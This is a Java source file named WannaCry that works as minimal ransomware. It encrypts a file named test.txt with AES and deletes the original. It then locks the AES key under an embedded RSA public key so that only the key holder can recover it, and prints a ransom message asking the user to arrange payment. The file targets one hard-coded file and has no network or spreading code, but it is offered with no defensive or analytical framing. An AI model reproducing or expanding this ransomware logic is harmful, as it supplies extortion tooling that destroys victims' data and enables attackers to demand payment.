import javax.crypto.*;
import javax.crypto.spec.*;
import java.io.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.*;
import java.util.Base64;

public class WannaCry {

    private static final String PubKey =
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqW9Skh563WZyyNnXOz3kK8QZpuZZ3rIwnFpP"
                    + "qoymMIiHlLBfvDKlHzw1xWFTqISBLkgjOCrDnFDy/LZo8hTFWdXoxoSHvZo/tzNkVNObjulneQTy8TXd"
                    + "tcdPxHDa5EKjXUTjseljPB8rgstU/ciFPb/sFTRWR0BPb0Sj0PDPE/zHW+mjVfK/3gDT+RNAdZpQr6w1"
                    + "6YiQqtuRrQOQLqwqtt1Ak/Oz49QXaK74mO+6QGtyfIC28ZpIXv5vxYZ6fcnb1qbmaouf6RxvVLAHoX1e"
                    + "Wi/s2Ykur2A0jho41GGXt0HVxEQouCxho46PERCUQT1LE1dZetfJ4WT3L7Z6Q6BYuQIDAQAB";

    public static void main(String[] args) throws Exception {

        // Generate Key
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(256);
        SecretKey aesKey = keyGen.generateKey();

        // Encrypt file
        byte[] iv = new byte[16];
        IvParameterSpec ivSpec = new IvParameterSpec(iv);

        Cipher aesCipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        aesCipher.init(Cipher.ENCRYPT_MODE, aesKey, ivSpec);

        byte[] plaintext = Files.readAllBytes(Paths.get("test.txt"));
        byte[] ciphertext = aesCipher.doFinal(plaintext);

        Files.write(Paths.get("test.txt.cry"), ciphertext);
        Files.delete(Paths.get("test.txt"));

        // Encrypt AES key with RSA public key
        byte[] masterPubBytes = Base64.getDecoder().decode(PubKey);
        X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(masterPubBytes);
        KeyFactory kf = KeyFactory.getInstance("RSA");
        PublicKey masterPubKey = kf.generatePublic(pubKeySpec);

        Cipher rsaCipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        rsaCipher.init(Cipher.ENCRYPT_MODE, masterPubKey);
        byte[] encryptedAesKey = rsaCipher.doFinal(aesKey.getEncoded());

        FileOutputStream fos = new FileOutputStream("aes.key");
        fos.write(encryptedAesKey);
        fos.close();

        System.out.println("Dear User! Please note that your files have now been encrypted.");
        System.out.println("To recover your files we ask you to follow the instructions");
        System.out.println("in the website below to arrange a small payment:");
    }
}